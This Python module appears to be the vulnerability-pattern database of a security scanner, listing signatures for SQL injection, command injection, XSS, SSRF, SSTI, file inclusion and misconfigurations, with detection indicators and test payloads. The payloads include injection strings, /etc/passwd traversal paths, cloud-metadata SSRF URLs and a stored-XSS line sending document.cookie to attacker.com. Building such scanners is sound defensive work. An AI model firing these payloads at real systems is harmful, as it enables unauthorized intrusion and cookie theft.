"""
WhiteHatHacker AI — Vulnerability Patterns Database

Pre-loaded vulnerability patterns, signatures, and detection
indicators. Used by the brain and FP engine for pattern matching,
attack prioritization, and false positive detection.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from enum import Enum


class PatternCategory(str, Enum):
    INJECTION = "injection"
    XSS = "xss"
    AUTH = "authentication"
    AUTHZ = "authorization"
    CRYPTO = "cryptography"
    SSRF = "ssrf"
    SSTI = "ssti"
    FILE = "file_operations"
    CONFIG = "misconfiguration"
    INFO_DISC = "information_disclosure"
    BUSINESS = "business_logic"
    NETWORK = "network"
    API = "api"
    DESERIALIZATION = "deserialization"


@dataclass
class VulnSignature:
    """A known vulnerability signature/indicator."""

    sig_id: str
    name: str
    category: PatternCategory
    description: str
    cwe: str = ""
    cvss_range: tuple[float, float] = (0.0, 10.0)

    # Detection
    indicators: list[str] = field(default_factory=list)       # What to look for
    response_patterns: list[str] = field(default_factory=list) # Response body patterns
    header_patterns: list[str] = field(default_factory=list)   # Response header patterns
    status_codes: list[int] = field(default_factory=list)      # Relevant HTTP codes

    # Context
    common_endpoints: list[str] = field(default_factory=list)  # Where often found
    common_params: list[str] = field(default_factory=list)     # Parameter names
    tech_stack: list[str] = field(default_factory=list)       # Associated technologies

    # Testing
    test_payloads: list[str] = field(default_factory=list)
    verification_method: str = ""
    tools: list[str] = field(default_factory=list)            # Best tools

    # FP info
    common_fp_causes: list[str] = field(default_factory=list)
    fp_indicators: list[str] = field(default_factory=list)

    # Scoring
    base_confidence: float = 50.0
    severity_default: str = "MEDIUM"


# ═══════════════════════════════════════════════════════════════════
# INJECTION PATTERNS
# ═══════════════════════════════════════════════════════════════════

SQL_INJECTION = VulnSignature(
    sig_id="VULN-SQLI-001",
    name="SQL Injection",
    category=PatternCategory.INJECTION,
    description="User input concatenated into SQL query without sanitization",
    cwe="CWE-89",
    cvss_range=(6.5, 9.8),
    indicators=[
        "SQL error in response",
        "Database error message",
        "Different response length for true/false conditions",
        "Time-based delay confirmed",
        "UNION query returns data from other tables",
        "Stacked queries executed",
    ],
    response_patterns=[
        "SQL syntax",
        "mysql_fetch",
        "ORA-",
        "pg_query",
        "sqlite3.",
        "SQLSTATE",
        "Microsoft OLE DB",
        "Unclosed quotation mark",
        "quoted string not properly terminated",
        "You have an error in your SQL syntax",
        "Warning: mysql_",
        "Warning: pg_",
        "Warning: mssql_",
        "ODBC SQL Server Driver",
        "PostgreSQL query failed",
    ],
    header_patterns=[],
    status_codes=[500, 200],
    common_endpoints=["/login", "/search", "/api/", "/user/", "/admin/", "/product/"],
    common_params=["id", "user", "name", "search", "query", "q", "sort", "order", "filter", "category"],
    tech_stack=["PHP", "MySQL", "PostgreSQL", "MSSQL", "Oracle", "ASP.NET", "Java"],
    test_payloads=[
        "'",
        "' OR '1'='1",
        "' OR 1=1--",
        "'; WAITFOR DELAY '0:0:5'--",
        "1' AND SLEEP(5)--",
        "1 UNION SELECT NULL--",
    ],
    verification_method="time_based_and_extraction",
    tools=["sqlmap", "nuclei", "commix"],
    common_fp_causes=[
        "WAF blocking produces error-like response",
        "Application error handling mimics SQL error",
        "Generic 500 error not related to injection",
    ],
    fp_indicators=[
        "Same error for all inputs",
        "WAF challenge page",
        "Custom error page without DB specifics",
    ],
    base_confidence=60.0,
    severity_default="HIGH",
)

COMMAND_INJECTION = VulnSignature(
    sig_id="VULN-CMDI-001",
    name="OS Command Injection",
    category=PatternCategory.INJECTION,
    description="User input passed to system shell command execution",
    cwe="CWE-78",
    cvss_range=(7.5, 10.0),
    indicators=[
        "Command output in response body",
        "Time delay with sleep/timeout payload",
        "DNS/HTTP callback received (OOB)",
        "System info (uname, hostname) reflected",
    ],
    response_patterns=[
        "uid=",
        "root:",
        "www-data",
        "Linux version",
        "Windows NT",
        "Directory of",
        "/bin/",
        "/etc/passwd",
    ],
    common_endpoints=["/api/", "/ping", "/traceroute", "/convert", "/upload", "/exec"],
    common_params=["cmd", "command", "exec", "ip", "host", "target", "file", "path", "url"],
    tech_stack=["PHP", "Python", "Node.js", "Perl", "CGI"],
    test_payloads=[
        "; id",
        "| id",
        "$(id)",
        "`id`",
        "; sleep 5",
        "| sleep 5",
    ],
    verification_method="oob_or_output_check",
    tools=["commix", "nuclei"],
    common_fp_causes=[
        "Error message contains shell-like text",
        "Application legitimately shows system info",
    ],
    base_confidence=55.0,
    severity_default="CRITICAL",
)

NOSQL_INJECTION = VulnSignature(
    sig_id="VULN-NOSQLI-001",
    name="NoSQL Injection",
    category=PatternCategory.INJECTION,
    description="NoSQL query manipulation via operator injection",
    cwe="CWE-943",
    cvss_range=(5.5, 9.0),
    indicators=[
        "Authentication bypass with $ne/$gt operators",
        "Different responses for operator-injected queries",
        "MongoDB error messages",
    ],
    response_patterns=[
        "MongoError",
        "MongoDB",
        "CastError",
        "ValidationError",
        "$where",
    ],
    common_params=["username", "password", "email", "id", "filter", "query"],
    tech_stack=["Node.js", "Express", "MongoDB", "CouchDB"],
    test_payloads=[
        '{"$ne": ""}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
        "[$ne]=1",
    ],
    verification_method="boolean_differential",
    tools=["nuclei"],
    base_confidence=50.0,
    severity_default="HIGH",
)

LDAP_INJECTION = VulnSignature(
    sig_id="VULN-LDAPI-001",
    name="LDAP Injection",
    category=PatternCategory.INJECTION,
    description="LDAP filter injection via unescaped user input",
    cwe="CWE-90",
    cvss_range=(5.0, 8.5),
    indicators=[
        "LDAP error in response",
        "Authentication bypass with wildcard",
        "Information disclosure via crafted filters",
    ],
    response_patterns=["LDAP", "ldap_search", "Invalid DN syntax"],
    common_params=["username", "user", "dn", "cn", "search", "filter"],
    tech_stack=["LDAP", "Active Directory", "OpenLDAP", "Java", "PHP"],
    test_payloads=["*", ")(cn=*", "*)(&", "*(|(objectclass=*))"],
    verification_method="boolean_differential",
    tools=["nuclei", "ldapsearch"],
    base_confidence=45.0,
    severity_default="HIGH",
)

# ═══════════════════════════════════════════════════════════════════
# XSS PATTERNS
# ═══════════════════════════════════════════════════════════════════

REFLECTED_XSS = VulnSignature(
    sig_id="VULN-RXSS-001",
    name="Reflected Cross-Site Scripting",
    category=PatternCategory.XSS,
    description="User input reflected in response without encoding",
    cwe="CWE-79",
    cvss_range=(4.0, 6.5),
    indicators=[
        "Payload reflected unencoded in response body",
        "JavaScript executes in browser context",
        "Script tag rendered in page",
        "Event handler attribute injected",
    ],
    response_patterns=[
        "<script>",
        "onerror=",
        "onload=",
        "javascript:",
        "alert(",
        "prompt(",
        "confirm(",
    ],
    common_endpoints=["/search", "/error", "/404", "/redirect", "/login"],
    common_params=["q", "search", "term", "query", "name", "msg", "error", "redirect", "url", "callback"],
    tech_stack=["PHP", "ASP.NET", "Java", "Ruby", "Node.js"],
    test_payloads=[
        '<script>alert(1)</script>',
        '"><img src=x onerror=alert(1)>',
        "'-alert(1)-'",
        '"><svg/onload=alert(1)>',
    ],
    verification_method="reflection_check_and_encoding_analysis",
    tools=["dalfox", "xsstrike", "nuclei"],
    common_fp_causes=[
        "Input reflected but properly encoded (&lt;script&gt;)",
        "CSP blocks execution",
        "WAF strips payload but tool doesn't re-verify",
        "Input in comment or non-executable context",
    ],
    fp_indicators=[
        "&lt;", "&gt;", "&#x", "Content-Security-Policy",
        "X-XSS-Protection: 1",
    ],
    base_confidence=45.0,
    severity_default="MEDIUM",
)

STORED_XSS = VulnSignature(
    sig_id="VULN-SXSS-001",
    name="Stored Cross-Site Scripting",
    category=PatternCategory.XSS,
    description="Malicious script stored persistently and executed for other users",
    cwe="CWE-79",
    cvss_range=(5.5, 8.5),
    indicators=[
        "Payload stored and reflected on subsequent page loads",
        "Script executes when other users view the page",
        "Persists across sessions",
    ],
    common_endpoints=["/comment", "/profile", "/post", "/message", "/review", "/feedback"],
    common_params=["comment", "body", "message", "name", "title", "bio", "description"],
    test_payloads=[
        '<script>fetch("https://attacker.com/"+document.cookie)</script>',
        '<img src=x onerror=fetch("https://callback/"+document.cookie)>',
    ],
    verification_method="store_then_retrieve_check",
    tools=["dalfox", "nuclei"],
    base_confidence=40.0,  # Harder to confirm automatically
    severity_default="HIGH",
)

DOM_XSS = VulnSignature(
    sig_id="VULN-DXSS-001",
    name="DOM-based Cross-Site Scripting",
    category=PatternCategory.XSS,
    description="Client-side JavaScript processes user input into dangerous sinks",
    cwe="CWE-79",
    cvss_range=(4.0, 7.0),
    indicators=[
        "JavaScript source-to-sink data flow identified",
        "User input flows to innerHTML/document.write/eval",
        "Hash/fragment-based input reflected in DOM",
    ],
    response_patterns=[
        "document.write",
        "innerHTML",
        ".html(",
        "eval(",
        "location.hash",
        "location.search",
        "document.URL",
    ],
    common_params=["#", "hash", "fragment"],
    test_payloads=[
        '#<img src=x onerror=alert(1)>',
        '#"><script>alert(1)</script>',
    ],
    verification_method="browser_dom_analysis",
    tools=["nuclei"],
    common_fp_causes=[
        "Sink exists but input is sanitized before reaching it",
        "JavaScript not actually reachable from user input",
    ],
    base_confidence=35.0,
    severity_default="MEDIUM",
)

# ═══════════════════════════════════════════════════════════════════
# SSRF / SSTI / FILE PATTERNS
# ═══════════════════════════════════════════════════════════════════

SSRF = VulnSignature(
    sig_id="VULN-SSRF-001",
    name="Server-Side Request Forgery",
    category=PatternCategory.SSRF,
    description="Server makes requests to attacker-controlled or internal URLs",
    cwe="CWE-918",
    cvss_range=(5.0, 9.8),
    indicators=[
        "OOB callback received from target server",
        "Internal service data in response",
        "Cloud metadata endpoint accessible",
        "Different response for internal vs external URLs",
    ],
    response_patterns=[
        "169.254.169.254",
        "metadata",
        "localhost",
        "127.0.0.1",
        "internal",
        "aws",
        "gcp",
        "azure",
    ],
    common_endpoints=["/proxy", "/fetch", "/url", "/load", "/image", "/webhook", "/callback"],
    common_params=["url", "uri", "link", "src", "href", "target", "redirect", "proxy", "fetch"],
    tech_stack=["Python", "Node.js", "Java", "PHP", "Ruby"],
    test_payloads=[
        "http://127.0.0.1:80",
        "http://169.254.169.254/latest/meta-data/",
        "http://[::1]",
        "http://0x7f000001",
        "http://attacker-callback.com",
    ],
    verification_method="oob_callback",
    tools=["nuclei"],
    common_fp_causes=[
        "Application legitimately fetches external URLs",
        "WAF blocks internal URLs but tool shows 'different response'",
    ],
    base_confidence=45.0,
    severity_default="HIGH",
)

SSTI = VulnSignature(
    sig_id="VULN-SSTI-001",
    name="Server-Side Template Injection",
    category=PatternCategory.SSTI,
    description="User input processed as template expressions by server-side engine",
    cwe="CWE-1336",
    cvss_range=(7.0, 10.0),
    indicators=[
        "Mathematical expression evaluated (e.g., {{7*7}}=49)",
        "Template engine error exposed",
        "Code execution via template expressions",
    ],
    response_patterns=[
        "49",  # 7*7
        "Jinja2",
        "Twig",
        "Freemarker",
        "Velocity",
        "Smarty",
        "TemplateError",
        "TemplateSyntaxError",
    ],
    common_endpoints=["/template", "/render", "/preview", "/email", "/pdf"],
    common_params=["template", "content", "body", "message", "name", "title"],
    tech_stack=["Python/Flask/Jinja2", "PHP/Twig", "Java/Freemarker", "Ruby/ERB"],
    test_payloads=[
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{{config}}",
        "{{self.__class__.__mro__}}",
    ],
    verification_method="expression_evaluation_check",
    tools=["nuclei", "commix"],
    base_confidence=55.0,
    severity_default="CRITICAL",
)

LFI = VulnSignature(
    sig_id="VULN-LFI-001",
    name="Local File Inclusion",
    category=PatternCategory.FILE,
    description="Server includes local files based on user-controlled input",
    cwe="CWE-98",
    cvss_range=(5.0, 9.0),
    indicators=[
        "/etc/passwd content in response",
        "Windows system file content in response",
        "Path traversal bypasses filters",
        "Null byte injection works",
    ],
    response_patterns=[
        "root:x:0:0:",
        "[boot loader]",
        "[extensions]",
        "<?php",
        "Warning: include(",
        "Warning: require(",
        "Failed opening",
    ],
    common_params=["file", "path", "page", "include", "template", "lang", "dir"],
    test_payloads=[
        "../../etc/passwd",
        "....//....//etc/passwd",
        "..%2f..%2fetc%2fpasswd",
        "/etc/passwd%00",
        "php://filter/convert.base64-encode/resource=index.php",
    ],
    verification_method="file_content_check",
    tools=["nuclei", "ffuf"],
    base_confidence=60.0,
    severity_default="HIGH",
)

# ═══════════════════════════════════════════════════════════════════
# AUTHENTICATION / AUTHORIZATION PATTERNS
# ═══════════════════════════════════════════════════════════════════

IDOR = VulnSignature(
    sig_id="VULN-IDOR-001",
    name="Insecure Direct Object Reference",
    category=PatternCategory.AUTHZ,
    description="Authorization check missing on object access via predictable IDs",
    cwe="CWE-639",
    cvss_range=(4.0, 8.5),
    indicators=[
        "Accessing other users' data by changing ID parameter",
        "Sequential/predictable object identifiers",
        "No authorization check on resource access",
        "Response differs when changing user context",
    ],
    common_endpoints=["/api/user/", "/api/order/", "/api/document/", "/account/", "/profile/"],
    common_params=["id", "user_id", "order_id", "doc_id", "account", "uid"],
    verification_method="cross_user_access_check",
    tools=["custom_idor_checker"],
    base_confidence=40.0,
    severity_default="HIGH",
)

AUTH_BYPASS = VulnSignature(
    sig_id="VULN-AUTH-001",
    name="Authentication Bypass",
    category=PatternCategory.AUTH,
    description="Authentication mechanism can be circumvented",
    cwe="CWE-287",
    cvss_range=(7.0, 10.0),
    indicators=[
        "Admin panel accessible without authentication",
        "JWT validation skippable (alg=none)",
        "Default credentials valid",
        "Path traversal bypasses auth middleware",
        "HTTP method override bypasses auth",
    ],
    response_patterns=[
        "admin",
        "dashboard",
        "Welcome",
        "authenticated",
    ],
    common_endpoints=["/admin", "/dashboard", "/api/admin", "/panel", "/manage"],
    tech_stack=["PHP", "Node.js", "Java", "Python", "ASP.NET"],
    test_payloads=[
        "admin/admin",
        "X-Forwarded-For: 127.0.0.1",
        "X-Original-URL: /admin",
        "",  # Empty auth header
    ],
    verification_method="authenticated_content_check",
    tools=["custom_auth_bypass", "nuclei"],
    base_confidence=50.0,
    severity_default="CRITICAL",
)

BROKEN_SESSION = VulnSignature(
    sig_id="VULN-SESS-001",
    name="Broken Session Management",
    category=PatternCategory.AUTH,
    description="Session tokens predictable, not invalidated, or insecurely transmitted",
    cwe="CWE-384",
    cvss_range=(4.0, 7.5),
    indicators=[
        "Session ID in URL",
        "Cookie without Secure/HttpOnly/SameSite flags",
        "Session not invalidated on logout",
        "Predictable session tokens",
    ],
    header_patterns=[
        "Set-Cookie:",
    ],
    common_fp_causes=[
        "Non-session cookies flagged (analytics, preferences)",
    ],
    base_confidence=55.0,
    severity_default="MEDIUM",
)

# ═══════════════════════════════════════════════════════════════════
# CONFIGURATION PATTERNS
# ═══════════════════════════════════════════════════════════════════

CORS_MISCONFIGURATION = VulnSignature(
    sig_id="VULN-CORS-001",
    name="CORS Misconfiguration",
    category=PatternCategory.CONFIG,
    description="Overly permissive CORS policy allows cross-origin data theft",
    cwe="CWE-942",
    cvss_range=(3.5, 7.5),
    indicators=[
        "Access-Control-Allow-Origin reflects arbitrary Origin",
        "Access-Control-Allow-Credentials: true with wildcard",
        "Null origin accepted",
    ],
    header_patterns=[
        "Access-Control-Allow-Origin",
        "Access-Control-Allow-Credentials",
    ],
    verification_method="origin_reflection_check",
    tools=["nuclei"],
    common_fp_causes=[
        "CORS header present but with legitimate allowed origins",
        "Public API intentionally allows *",
    ],
    base_confidence=50.0,
    severity_default="MEDIUM",
)

SECURITY_HEADERS_MISSING = VulnSignature(
    sig_id="VULN-HDR-001",
    name="Missing Security Headers",
    category=PatternCategory.CONFIG,
    description="Important security headers not set in HTTP responses",
    cwe="CWE-693",
    cvss_range=(2.0, 4.0),
    indicators=[
        "Missing Content-Security-Policy",
        "Missing X-Frame-Options",
        "Missing X-Content-Type-Options",
        "Missing Strict-Transport-Security",
        "Missing Referrer-Policy",
        "Missing Permissions-Policy",
    ],
    verification_method="header_presence_check",
    tools=["httpx", "nikto", "nuclei"],
    base_confidence=90.0,  # Very reliable
    severity_default="LOW",
)

SSL_TLS_ISSUES = VulnSignature(
    sig_id="VULN-SSL-001",
    name="SSL/TLS Configuration Issues",
    category=PatternCategory.CRYPTO,
    description="Weak SSL/TLS configuration, deprecated protocols, or certificate issues",
    cwe="CWE-326",
    cvss_range=(3.0, 7.5),
    indicators=[
        "SSLv3 or TLS 1.0/1.1 enabled",
        "Weak cipher suites accepted",
        "Self-signed or expired certificate",
        "Missing HSTS header",
        "Vulnerable to BEAST/POODLE/DROWN/Heartbleed",
    ],
    verification_method="ssl_scan",
    tools=["sslscan", "sslyze", "nmap"],
    common_fp_causes=[
        "CDN/proxy terminates TLS (backend config doesn't matter)",
    ],
    base_confidence=85.0,
    severity_default="MEDIUM",
)

OPEN_REDIRECT = VulnSignature(
    sig_id="VULN-REDIR-001",
    name="Open Redirect",
    category=PatternCategory.CONFIG,
    description="Application redirects to user-controlled external URL",
    cwe="CWE-601",
    cvss_range=(3.0, 6.0),
    indicators=[
        "302/301 redirect to external domain",
        "Location header contains user input",
        "JavaScript redirect with user-controlled URL",
    ],
    common_endpoints=["/redirect", "/login", "/oauth", "/callback", "/return", "/goto"],
    common_params=["url", "redirect", "return", "next", "goto", "target", "redir", "continue"],
    test_payloads=[
        "https://evil.com",
        "//evil.com",
        "/\\evil.com",
        "https://evil.com%2F%2F",
    ],
    verification_method="redirect_follow_check",
    tools=["nuclei"],
    base_confidence=65.0,
    severity_default="LOW",
)

DIRECTORY_LISTING = VulnSignature(
    sig_id="VULN-DIRLIST-001",
    name="Directory Listing Enabled",
    category=PatternCategory.INFO_DISC,
    description="Web server reveals directory contents",
    cwe="CWE-548",
    cvss_range=(2.0, 5.0),
    indicators=[
        "Index of / in response title",
        "Directory listing with file names",
        "Apache/Nginx autoindex enabled",
    ],
    response_patterns=[
        "Index of /",
        "Directory listing for",
        "Parent Directory",
        "<title>Index of",
    ],
    verification_method="response_content_check",
    tools=["nikto", "nuclei", "ffuf"],
    base_confidence=90.0,
    severity_default="LOW",
)

SENSITIVE_FILE_EXPOSURE = VulnSignature(
    sig_id="VULN-FILES-001",
    name="Sensitive File Exposure",
    category=PatternCategory.INFO_DISC,
    description="Sensitive files accessible via web (config, backup, secrets)",
    cwe="CWE-538",
    cvss_range=(4.0, 9.0),
    indicators=[
        ".git directory accessible",
        ".env file exposed",
        "Backup files (.bak, .old, .swp)",
        "Configuration files (web.config, wp-config.php)",
        "Database dumps accessible",
    ],
    response_patterns=[
        "DB_PASSWORD",
        "API_KEY",
        "SECRET_KEY",
        "password",
        "[core]",
        "ref: refs/",
    ],
    common_endpoints=[
        "/.git/HEAD", "/.env", "/.htaccess", "/web.config",
        "/wp-config.php.bak", "/.svn/entries", "/backup.sql",
        "/robots.txt", "/sitemap.xml", "/.well-known/",
    ],
    verification_method="file_content_check",
    tools=["ffuf", "gobuster", "nikto", "nuclei"],
    base_confidence=80.0,
    severity_default="HIGH",
)

# ═══════════════════════════════════════════════════════════════════
# NETWORK PATTERNS
# ═══════════════════════════════════════════════════════════════════

SMB_ISSUES = VulnSignature(
    sig_id="VULN-SMB-001",
    name="SMB Misconfiguration",
    category=PatternCategory.NETWORK,
    description="SMB service misconfigured (null session, signing disabled, etc.)",
    cwe="CWE-287",
    cvss_range=(4.0, 8.0),
    indicators=[
        "Null session allowed",
        "SMB signing not required",
        "Anonymous share access",
        "SMBv1 enabled",
        "Guest authentication allowed",
    ],
    tools=["enum4linux", "smbclient", "netexec", "nmap"],
    base_confidence=75.0,
    severity_default="MEDIUM",
)

SNMP_ISSUES = VulnSignature(
    sig_id="VULN-SNMP-001",
    name="SNMP Information Disclosure",
    category=PatternCategory.NETWORK,
    description="SNMP service with default/weak community strings",
    cwe="CWE-200",
    cvss_range=(4.0, 7.0),
    indicators=[
        "Default community string 'public' works",
        "System information via SNMP",
        "Write community string found",
    ],
    tools=["snmpwalk", "nmap"],
    base_confidence=80.0,
    severity_default="MEDIUM",
)

SSH_WEAK_CONFIG = VulnSignature(
    sig_id="VULN-SSH-001",
    name="SSH Weak Configuration",
    category=PatternCategory.CRYPTO,
    description="SSH server uses weak ciphers, KEX, or allows root login",
    cwe="CWE-327",
    cvss_range=(2.0, 5.0),
    indicators=[
        "Weak ciphers supported (DES, RC4, etc.)",
        "Weak KEX algorithms",
        "Weak MAC algorithms",
        "Root login permitted",
        "Password authentication enabled",
    ],
    tools=["ssh_audit", "nmap"],
    base_confidence=85.0,
    severity_default="LOW",
)

# ═══════════════════════════════════════════════════════════════════
# API-SPECIFIC PATTERNS
# ═══════════════════════════════════════════════════════════════════

API_AUTH_ISSUES = VulnSignature(
    sig_id="VULN-API-001",
    name="API Authentication Issues",
    category=PatternCategory.API,
    description="API endpoints accessible without proper authentication",
    cwe="CWE-306",
    cvss_range=(5.0, 9.0),
    indicators=[
        "API endpoints return data without auth token",
        "Expired tokens still accepted",
        "API key in URL (not header)",
        "No rate limiting on auth endpoints",
    ],
    common_endpoints=["/api/v1/", "/api/v2/", "/graphql", "/rest/"],
    tools=["httpx", "nuclei"],
    base_confidence=50.0,
    severity_default="HIGH",
)

GRAPHQL_ISSUES = VulnSignature(
    sig_id="VULN-GQL-001",
    name="GraphQL Security Issues",
    category=PatternCategory.API,
    description="GraphQL endpoint with introspection/excessive data exposure",
    cwe="CWE-200",
    cvss_range=(3.0, 7.0),
    indicators=[
        "Introspection query returns full schema",
        "Nested query depth not limited (DoS)",
        "Sensitive fields accessible",
        "Mutation operations without auth",
    ],
    common_endpoints=["/graphql", "/gql", "/api/graphql"],
    test_payloads=[
        '{"query": "{__schema{types{name}}}"}',
        '{"query": "{__type(name:\\"Query\\"){fields{name}}}"}',
    ],
    verification_method="introspection_check",
    tools=["nuclei", "httpx"],
    base_confidence=70.0,
    severity_default="MEDIUM",
)

# ═══════════════════════════════════════════════════════════════════
# PATTERN DATABASE
# ═══════════════════════════════════════════════════════════════════

ALL_PATTERNS: dict[str, VulnSignature] = {
    # Injection
    "sqli": SQL_INJECTION,
    "cmdi": COMMAND_INJECTION,
    "nosqli": NOSQL_INJECTION,
    "ldapi": LDAP_INJECTION,
    # XSS
    "rxss": REFLECTED_XSS,
    "sxss": STORED_XSS,
    "dxss": DOM_XSS,
    # SSRF / SSTI / File
    "ssrf": SSRF,
    "ssti": SSTI,
    "lfi": LFI,
    # Auth
    "idor": IDOR,
    "auth_bypass": AUTH_BYPASS,
    "session": BROKEN_SESSION,
    # Config
    "cors": CORS_MISCONFIGURATION,
    "headers": SECURITY_HEADERS_MISSING,
    "ssl": SSL_TLS_ISSUES,
    "open_redirect": OPEN_REDIRECT,
    "dirlist": DIRECTORY_LISTING,
    "sensitive_files": SENSITIVE_FILE_EXPOSURE,
    # Network
    "smb": SMB_ISSUES,
    "snmp": SNMP_ISSUES,
    "ssh": SSH_WEAK_CONFIG,
    # API
    "api_auth": API_AUTH_ISSUES,
    "graphql": GRAPHQL_ISSUES,
}


def get_patterns_for_tech(tech: str) -> list[VulnSignature]:
    """Get vulnerability patterns relevant to a specific technology."""
    tech_lower = tech.lower()
    results = []
    for pattern in ALL_PATTERNS.values():
        for t in pattern.tech_stack:
            if tech_lower in t.lower():
                results.append(pattern)
                break
    return results


def get_patterns_by_category(category: PatternCategory) -> list[VulnSignature]:
    """Get all patterns in a specific category."""
    return [p for p in ALL_PATTERNS.values() if p.category == category]


def get_patterns_for_endpoint(endpoint: str) -> list[VulnSignature]:
    """Get patterns that commonly affect a specific endpoint pattern."""
    results = []
    endpoint_lower = endpoint.lower()
    for pattern in ALL_PATTERNS.values():
        for ep in pattern.common_endpoints:
            if ep.lower() in endpoint_lower or endpoint_lower in ep.lower():
                results.append(pattern)
                break
    return results


def get_patterns_for_param(param: str) -> list[VulnSignature]:
    """Get patterns that commonly affect a specific parameter name."""
    param_lower = param.lower()
    return [
        p for p in ALL_PATTERNS.values()
        if param_lower in [cp.lower() for cp in p.common_params]
    ]


def get_test_payloads(vuln_type: str) -> list[str]:
    """Get test payloads for a specific vulnerability type."""
    pattern = ALL_PATTERNS.get(vuln_type)
    if pattern:
        return pattern.test_payloads
    return []


def get_fp_indicators(vuln_type: str) -> list[str]:
    """Get known false positive indicators for a vulnerability type."""
    pattern = ALL_PATTERNS.get(vuln_type)
    if pattern:
        return pattern.fp_indicators
    return []


__all__ = [
    "VulnSignature",
    "PatternCategory",
    "ALL_PATTERNS",
    "get_patterns_for_tech",
    "get_patterns_by_category",
    "get_patterns_for_endpoint",
    "get_patterns_for_param",
    "get_test_payloads",
    "get_fp_indicators",
]
